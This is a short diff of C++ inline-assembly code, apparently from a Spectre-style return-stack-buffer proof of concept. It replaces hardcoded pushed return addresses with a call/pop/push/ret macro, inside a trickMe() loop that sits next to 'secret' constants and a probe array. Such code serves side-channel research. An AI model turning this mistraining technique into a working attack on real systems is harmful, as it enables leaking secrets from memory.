@@ -7,6 +7,8 @@
 #define secret2 13427
 #define nonsecret 21142
 
+#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"
+
 using namespace std;
 
 char array[256*256];
@@ -36,25 +38,22 @@ void trickMe() {
 	for (int i = 0; i < 10000; i++) {
 		sched_yield();
 		asm(
-			"mov $0x0000555555554c74,%0;" "push %0;"
-			"mov $0x0000555555554c73,%0;" "push %0;"
-			"mov $0x0000555555554c72,%0;" "push %0;"
-			"mov $0x0000555555554c71,%0;" "push %0;"
-			"mov $0x0000555555554c70,%0;" "push %0;"
-			"mov $0x0000555555554c6f,%0;" "push %0;"
-			"mov $0x0000555555554c6e,%0;" "push %0;"
-			"mov $0x0000555555554c6d,%0;" "push %0;"
-			"mov $0x0000555555554c6c,%0;" "push %0;"
-			"mov $0x0000555555554c6b,%0;" "push %0;"
-			"mov $0x0000555555554c6a,%0;" "push %0;"
-			"mov $0x0000555555554c69,%0;" "push %0;"
-			"mov $0x0000555555554c68,%0;" "push %0;"
-			"mov $0x0000555555554c67,%0;" "push %0;"
-			"mov $0x0000555555554c66,%0;" "push %0;"
-			"mov $0x0000555555554c65,%0;" "push %0;"
-			".rept 16;"
-			"ret;"
-			".endr;"
+			retAsm(1)
+			retAsm(2)
+			retAsm(3)
+			retAsm(4)
+			retAsm(5)
+			retAsm(6)
+			retAsm(7)
+			retAsm(8)
+			retAsm(9)
+			retAsm(10)
+			retAsm(11)
+			retAsm(12)
+			retAsm(13)
+			retAsm(14)
+			retAsm(15)
+			retAsm(16)
 			: "=r" (tmp)
 			: "r" (address)
 		);
